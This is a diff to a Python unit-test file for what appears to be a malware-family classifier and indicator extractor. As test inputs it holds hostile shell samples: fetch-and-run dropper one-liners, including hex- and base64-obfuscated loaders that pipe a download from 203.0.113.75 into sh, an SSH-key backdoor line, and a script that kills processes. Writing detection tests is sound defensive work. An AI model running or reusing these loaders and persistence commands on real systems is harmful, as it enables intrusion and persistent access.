@@ -72,7 +72,22 @@ class FileInfo(unittest.TestCase):
         self.assertEqual(fileinfo.family(b"\x7fELF../dev/watchdog..TSource Engine Query"), "Mirai")
         self.assertEqual(fileinfo.family(b"#!/bin/sh\ncd /tmp; wget http://x/a; chmod 777 a; ./a"), "Dropper script")
         self.assertEqual(fileinfo.family(b"echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys"), "SSH key backdoor")
+        killer = (b"#!/bin/sh\nfor proc_dir in /proc/*; do\n pid=${proc_dir##*/}\n result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n"
+                  b" if [ \"$result\" != \"${result%(deleted)}\" ]; then\n kill -9 \"$pid\"\n fi\ndone\n")
+        self.assertEqual(fileinfo.family(killer), "Competitor killer")
         self.assertEqual(fileinfo.family(b"nothing interesting here"), "")
+
+    def test_hidden_loaders(self):
+        # Real-world shapes seen on a honeypot (with documentation addresses): a fallback loader, the same as \\x escapes,
+        # and a base64 one-liner. All three are droppers, and the C2 address inside is found.
+        loader = b"S=203.0.113.75; (wget http://$S/p -O-||curl http://$S/p||busybox wget http://$S/p -O-) | sh"
+        hexed = b"".join(b"\\x%02x" % c for c in loader)
+        b64 = b"echo " + __import__("base64").b64encode(loader) + b" | base64 -d | sh"
+        for sample in (loader, hexed, b64):
+            u = fileinfo.unpack(sample)
+            self.assertEqual(fileinfo.family(u), "Dropper script", sample[:30])
+            self.assertIn("203.0.113.75", " ".join(fileinfo.iocs(u)) + u.decode("latin-1"))
+        self.assertEqual(fileinfo.unpack(b"\x7fELF\\x41\\x42"), b"\x7fELF\\x41\\x42")   # binaries are left alone
 
     def test_iocs(self):
         out = fileinfo.iocs(b"wget http://8.8.4.4/bins/mips; 10.0.0.1 1.2.3.4:4444 http://example.com/a.sh.")
